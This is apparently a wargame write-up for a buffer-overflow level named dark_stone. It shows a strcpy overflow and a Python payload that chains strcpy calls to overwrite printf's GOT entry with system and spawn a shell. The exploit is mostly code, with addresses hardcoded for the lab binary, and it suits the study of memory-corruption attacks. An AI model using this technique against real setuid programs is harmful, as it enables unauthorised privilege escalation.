# Vulnerability
```c
char buffer[256];
char temp[1024];
strcpy(buffer, temp);
```
This program uses strcpy function so I can overwrite SFP & RET address.

# Exploitation
This problem is same as previous problem.

I used `GOT Overwrite` method to get shell.

# Payload
```python
import os
from struct import *
from socket import *

p = lambda x:pack("<L", x)
target = "/home/evil_wizard/dark_stone"

strcpy_plt = 0x08048438
printf_plt = 0x08048408
printf_got = 0x0804984c
pop_pop_ret = 0x080484f3
bss = 0x08049868
sh_addr = 0x833603

system_1 = 0x080484d0 # c0
system_2 = 0x08048364 # 07
system_3 = 0x080486bf # 75
system_4 = 0x08048471 # 00

payload = ""
payload += "A"*268
payload += p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+0) + p(system_1)
payload += p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+1) + p(system_2)
payload += p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+2) + p(system_3)
payload += p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+3) + p(system_4)
payload += p(printf_plt) + "AAAA" + p(sh_addr)

print payload
```
